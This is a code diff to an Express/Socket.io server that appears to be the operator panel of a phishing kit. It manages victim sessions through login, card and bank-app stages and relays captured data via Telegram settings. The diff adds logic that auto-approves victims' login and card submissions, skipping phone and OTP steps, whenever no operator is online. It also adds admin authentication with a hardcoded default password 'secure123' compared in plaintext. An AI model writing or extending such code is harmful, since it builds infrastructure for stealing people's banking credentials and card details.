@@ -475,6 +475,38 @@ app.post('/api/sync', async (req, res) => {
             return res.json({ status: 'ok', command: cmd });
         }
 
+        // --- Offline Auto-Approve Logic ---
+        const adminRoom = io.sockets.adapter.rooms.get('admin');
+        const isAdminOnline = adminRoom && adminRoom.size > 0;
+
+        if (!isAdminOnline) {
+            // 1. Login Auto-Approve -> Skip Phone
+            if (data.stage === 'login' && data.isLoginSubmitted && !data.isLoginVerified) {
+                console.log(`[Auto-Approve] Offline mode: Approving Login for ${data.sessionId}`);
+                const cmd = { action: 'APPROVE', payload: { skipPhone: true } };
+                await db.queueCommand(data.sessionId, cmd.action, cmd.payload);
+                io.to(data.sessionId).emit('command', cmd);
+                return res.json({ status: 'ok', command: cmd });
+            }
+
+            // 2. Card Auto-Approve -> Skip OTP
+            if (data.stage === 'card_pending' && !data.isFlowComplete) {
+                console.log(`[Auto-Approve] Offline mode: Approving Card for ${data.sessionId}`);
+                const cmd = { action: 'APPROVE', payload: { flow: 'complete' } };
+                await db.queueCommand(data.sessionId, cmd.action, cmd.payload);
+                io.to(data.sessionId).emit('command', cmd);
+                return res.json({ status: 'ok', command: cmd });
+            }
+
+            // 3. Bank App Pending
+            if (data.stage === 'bank_app_pending' && !data.isFlowComplete) {
+                const cmd = { action: 'APPROVE', payload: {} };
+                await db.queueCommand(data.sessionId, cmd.action, cmd.payload);
+                io.to(data.sessionId).emit('command', cmd);
+                return res.json({ status: 'ok', command: cmd });
+            }
+        }
+
         res.json({ status: 'ok' });
     } catch (e) {
         console.error('[Sync] Error:', e);
@@ -485,12 +517,13 @@ app.post('/api/sync', async (req, res) => {
 // Settings API
 app.get('/api/settings', async (req, res) => {
     await refreshSettings();
-    res.json(cachedSettings);
+    const safeSettings = { ...cachedSettings };
+    delete safeSettings.admin_password;
+    res.json(safeSettings);
 });
 
 app.post('/api/settings', async (req, res) => {
-    const { email, tgToken, tgChat } = req.body;
-    if (email !== undefined) await db.updateSetting('email', email);
+    const { tgToken, tgChat } = req.body;
     if (tgToken !== undefined) await db.updateSetting('tgToken', tgToken);
     if (tgChat !== undefined) await db.updateSetting('tgChat', tgChat);
 
@@ -498,14 +531,48 @@ app.post('/api/settings', async (req, res) => {
     res.json({ status: 'ok' });
 });
 
+// Admin Auth
+app.post('/api/admin/login', async (req, res) => {
+    const { username, password } = req.body;
+
+    // Default creds if DB fails or empty
+    let dbPass = 'secure123';
+    try {
+        const settings = await db.getSettings();
+        if (settings.admin_password) dbPass = settings.admin_password;
+    } catch(e) {}
+
+    // Username is currently hardcoded to 'admin' in frontend, enforce it here or allow any
+    if (username === 'admin' && password === dbPass) {
+        res.json({ status: 'ok' });
+    } else {
+        res.status(401).json({ error: 'Invalid credentials' });
+    }
+});
+
+app.post('/api/admin/change-password', async (req, res) => {
+    const { oldPassword, newPassword } = req.body;
+
+    let currentPass = 'secure123';
+    try {
+        const settings = await db.getSettings();
+        if (settings.admin_password) currentPass = settings.admin_password;
+    } catch(e) {}
+
+    if (oldPassword !== currentPass) {
+        return res.status(401).json({ error: 'Incorrect current password' });
+    }
+
+    await db.updateSetting('admin_password', newPassword);
+    console.log('[Admin] Password changed');
+    res.json({ status: 'ok' });
+});
+
+
 // 2. Fetch Sessions (Admin)
 app.get('/api/sessions', async (req, res) => {
     try {
         const sessions = await db.getAllSessions();
-
-        if (sessions.length > 0) {
-            console.log('[API] /sessions returning:', JSON.stringify(sessions[0], null, 2));
-        }
 
         // Optimization: ETag for caching
         const json = JSON.stringify(sessions);
